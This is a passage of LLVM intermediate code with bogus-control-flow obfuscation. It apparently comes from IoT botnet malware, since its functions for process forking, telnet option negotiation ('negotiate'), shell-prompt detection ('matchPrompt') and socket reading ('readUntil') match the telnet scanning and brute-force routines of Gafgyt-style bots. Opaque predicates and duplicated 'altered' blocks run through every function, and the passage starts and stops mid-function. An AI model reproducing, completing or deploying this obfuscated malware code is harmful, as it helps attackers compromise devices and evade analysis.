  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #4
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #4
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #4
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* @x.47
  %49 = load i32, i32* @y.48
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %47
  %56 = load i32, i32* %1, align 4
  %57 = load i32, i32* @x.47
  %58 = load i32, i32* @y.48
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %56

originalBBalteredBB:                              ; preds = %originalBB, %47
  %65 = load i32, i32* %1, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %125 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %159

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %118

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %23
  %30 = load i32, i32* @x.49
  %31 = load i32, i32* @y.50
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  store i8 -4, i8* %8, align 1
  %38 = load i32, i32* @x.49
  %39 = load i32, i32* @y.50
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %101

; <label>:46:                                     ; preds = %23
  %47 = load i32, i32* @x.49
  %48 = load i32, i32* @y.50
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8*, i8** %6, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 1
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 3, %58
  %60 = load i32, i32* @x.49
  %61 = load i32, i32* @y.50
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %76

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i8*, i8** %6, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 251, i32 253
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %8, align 1
  br label %100

; <label>:76:                                     ; preds = %originalBBpart24
  %77 = load i32, i32* @x.49
  %78 = load i32, i32* @y.50
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = load i8*, i8** %6, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 1
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 253
  %90 = select i1 %89, i32 252, i32 254
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %8, align 1
  %92 = load i32, i32* @x.49
  %93 = load i32, i32* @y.50
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %100

; <label>:100:                                    ; preds = %originalBBpart28, %68
  br label %101

; <label>:101:                                    ; preds = %100, %originalBBpart2
  %102 = load i32, i32* @x.49
  %103 = load i32, i32* @y.50
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* @x.49
  %111 = load i32, i32* @y.50
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %118

; <label>:118:                                    ; preds = %originalBBpart212, %22
  %119 = load i32, i32* %5, align 4
  %120 = call i64 @send(i32 %119, i8* %8, i64 1, i32 16384)
  %121 = load i32, i32* %5, align 4
  %122 = load i8*, i8** %6, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 2
  %124 = call i64 @send(i32 %121, i8* %123, i64 1, i32 16384)
  br label %142

; <label>:125:                                    ; preds = %3
  %126 = load i32, i32* @x.49
  %127 = load i32, i32* @y.50
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i32, i32* @x.49
  %135 = load i32, i32* @y.50
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %142

; <label>:142:                                    ; preds = %originalBBpart216, %118
  %143 = load i32, i32* @x.49
  %144 = load i32, i32* @y.50
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  store i32 0, i32* %4, align 4
  %151 = load i32, i32* @x.49
  %152 = load i32, i32* @y.50
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %159

; <label>:159:                                    ; preds = %originalBBpart220, %13
  %160 = load i32, i32* %4, align 4
  ret i32 %160

originalBBalteredBB:                              ; preds = %originalBB, %29
  store i8 -4, i8* %8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %161 = load i8*, i8** %6, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 1
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 3, %164
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %166 = load i8*, i8** %6, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 1
  %168 = load i8, i8* %167, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 253
  %171 = select i1 %170, i32 252, i32 254
  %172 = trunc i32 %171 to i8
  store i8 %172, i8* %8, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  store i32 0, i32* %4, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %145, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %148

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %122, %17
  %19 = load i32, i32* @x.51
  %20 = load i32, i32* @y.52
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %7, align 4
  %29 = icmp sgt i32 %27, %28
  %30 = load i32, i32* @x.51
  %31 = load i32, i32* @y.52
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %120

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i32, i32* @x.51
  %40 = load i32, i32* @y.52
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 0
  %58 = load i32, i32* @x.51
  %59 = load i32, i32* @y.52
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br i1 %57, label %118, label %66

; <label>:66:                                     ; preds = %originalBBpart25
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 32
  br i1 %77, label %118, label %78

; <label>:78:                                     ; preds = %66
  %79 = load i8*, i8** %3, align 8
  %80 = load i32, i32* %5, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i32, i32* %7, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 0, %84
  %86 = getelementptr inbounds i8, i8* %82, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = icmp eq i32 %88, 13
  br i1 %89, label %118, label %90

; <label>:90:                                     ; preds = %78
  %91 = load i32, i32* @x.51
  %92 = load i32, i32* @y.52
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %90
  %99 = load i8*, i8** %3, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i32, i32* %7, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 0, %104
  %106 = getelementptr inbounds i8, i8* %102, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = load i32, i32* @x.51
  %111 = load i32, i32* @y.52
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart215, label %originalBB7alteredBB

originalBBpart215:                                ; preds = %originalBB7
  br label %118

; <label>:118:                                    ; preds = %originalBBpart215, %78, %66, %originalBBpart25
  %119 = phi i1 [ true, %78 ], [ true, %66 ], [ true, %originalBBpart25 ], [ %109, %originalBBpart215 ]
  br label %120

; <label>:120:                                    ; preds = %118, %originalBBpart2
  %121 = phi i1 [ false, %originalBBpart2 ], [ %119, %118 ]
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %7, align 4
  br label %18

; <label>:125:                                    ; preds = %120
  %126 = load i8*, i8** %3, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  %130 = load i32, i32* %7, align 4
  %131 = sext i32 %130 to i64
  %132 = sub i64 0, %131
  %133 = getelementptr inbounds i8, i8* %129, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = load i8*, i8** %4, align 8
  %137 = load i32, i32* %6, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = icmp eq i32 %135, %141
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %125
  store i32 1, i32* %2, align 4
  br label %149

; <label>:144:                                    ; preds = %125
  br label %145

; <label>:145:                                    ; preds = %144
  %146 = load i32, i32* %6, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %6, align 4
  br label %11

; <label>:148:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %149

; <label>:149:                                    ; preds = %148, %143
  %150 = load i32, i32* %2, align 4
  ret i32 %150

originalBBalteredBB:                              ; preds = %originalBB, %18
  %151 = load i32, i32* %5, align 4
  %152 = load i32, i32* %7, align 4
  %153 = icmp sgt i32 %151, %152
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %154 = load i8*, i8** %3, align 8
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %154, i64 %156
  %158 = load i32, i32* %7, align 4
  %159 = sext i32 %158 to i64
  %_ = sub i64 0, 0
  %gen = add i64 %_, %159
  %_2 = sub i64 0, 0
  %gen3 = add i64 %_2, %159
  %160 = sub i64 0, %159
  %161 = getelementptr inbounds i8, i8* %157, i64 %160
  %162 = load i8, i8* %161, align 1
  %163 = sext i8 %162 to i32
  %164 = icmp eq i32 %163, 0
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %90
  %165 = load i8*, i8** %3, align 8
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8, i8* %165, i64 %167
  %169 = load i32, i32* %7, align 4
  %170 = sext i32 %169 to i64
  %_8 = sub i64 0, %170
  %gen9 = mul i64 %_8, %170
  %_10 = sub i64 0, %170
  %gen11 = mul i64 %_10, %170
  %_12 = sub i64 0, 0
  %gen13 = add i64 %_12, %170
  %171 = sub i64 0, %170
  %172 = getelementptr inbounds i8, i8* %168, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 10
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = load i32, i32* @x.53
  %10 = load i32, i32* @y.54
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %struct.__sigset_t, align 8
  %30 = alloca %struct.timeval, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 %0, i32* %18, align 4
  store i8* %1, i8** %19, align 8
  store i32 %2, i32* %20, align 4
  store i32 %3, i32* %21, align 4
  store i32 %4, i32* %22, align 4
  store i8* %5, i8** %23, align 8
  store i32 %6, i32* %24, align 4
  store i32 %7, i32* %25, align 4
  %34 = load i32, i32* %25, align 4
  store i32 %34, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %35 = load i32, i32* %21, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  store i64 %36, i64* %37, align 8
  %38 = load i32, i32* %22, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  store i64 %39, i64* %40, align 8
  store i8* null, i8** %31, align 8
  %41 = load i32, i32* @x.53
  %42 = load i32, i32* @y.54
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %264, %originalBBpart2
  %50 = load i32, i32* %26, align 4
  %51 = add nsw i32 %50, 2
  %52 = load i32, i32* %24, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %80

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = icmp sgt i64 %56, 0
  br i1 %57, label %62, label %58

; <label>:58:                                     ; preds = %54
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %30, i32 0, i32 1
  %60 = load i64, i64* %59, align 8
  %61 = icmp sgt i64 %60, 0
  br label %62

; <label>:62:                                     ; preds = %58, %54
  %63 = phi i1 [ true, %54 ], [ %61, %58 ]
  %64 = load i32, i32* @x.53
  %65 = load i32, i32* @y.54
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %72 = load i32, i32* @x.53
  %73 = load i32, i32* @y.54
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %80

; <label>:80:                                     ; preds = %originalBBpart24, %49
  %81 = phi i1 [ false, %49 ], [ %63, %originalBBpart24 ]
  %82 = load i32, i32* @x.53
  %83 = load i32, i32* @y.54
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %80
  %90 = load i32, i32* @x.53
  %91 = load i32, i32* @y.54
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %81, label %98, label %265

; <label>:98:                                     ; preds = %originalBBpart28
  %99 = load i32, i32* @x.53
  %100 = load i32, i32* @y.54
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %98
  %107 = load i32, i32* @x.53
  %108 = load i32, i32* @y.54
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %115

; <label>:115:                                    ; preds = %originalBBpart212
  %116 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %117 = getelementptr inbounds [16 x i64], [16 x i64]* %116, i64 0, i64 0
  %118 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %117) #4, !srcloc !4
  %119 = extractvalue { i64, i64* } %118, 0
  %120 = extractvalue { i64, i64* } %118, 1
  %121 = trunc i64 %119 to i32
  store i32 %121, i32* %32, align 4
  %122 = ptrtoint i64* %120 to i64
  %123 = trunc i64 %122 to i32
  store i32 %123, i32* %33, align 4
  br label %124

; <label>:124:                                    ; preds = %115
  %125 = load i32, i32* %18, align 4
  %126 = srem i32 %125, 64
  %127 = zext i32 %126 to i64
  %128 = shl i64 1, %127
  %129 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %29, i32 0, i32 0
  %130 = load i32, i32* %18, align 4
  %131 = sdiv i32 %130, 64
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds [16 x i64], [16 x i64]* %129, i64 0, i64 %132
  %134 = load i64, i64* %133, align 8
  %135 = or i64 %134, %128
  store i64 %135, i64* %133, align 8
  %136 = load i32, i32* %18, align 4
  %137 = add nsw i32 %136, 1
  %138 = call i32 @select(i32 %137, %struct.__sigset_t* %29, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %30)
  %139 = icmp slt i32 %138, 1
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %124
  br label %265

; <label>:141:                                    ; preds = %124
  %142 = load i32, i32* @x.53
  %143 = load i32, i32* @y.54
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %141
  %150 = load i8*, i8** %23, align 8
  %151 = load i32, i32* %26, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  store i8* %153, i8** %31, align 8
  %154 = load i32, i32* %18, align 4
  %155 = load i8*, i8** %31, align 8
  %156 = call i64 @recv(i32 %154, i8* %155, i64 1, i32 0)
  %157 = trunc i64 %156 to i32
  store i32 %157, i32* %27, align 4
  %158 = load i32, i32* %27, align 4
  %159 = icmp eq i32 %158, -1
  %160 = load i32, i32* @x.53
  %161 = load i32, i32* @y.54
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %159, label %187, label %168

; <label>:168:                                    ; preds = %originalBBpart216
  %169 = load i32, i32* @x.53
  %170 = load i32, i32* @y.54
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB18, label %originalBB18alteredBB

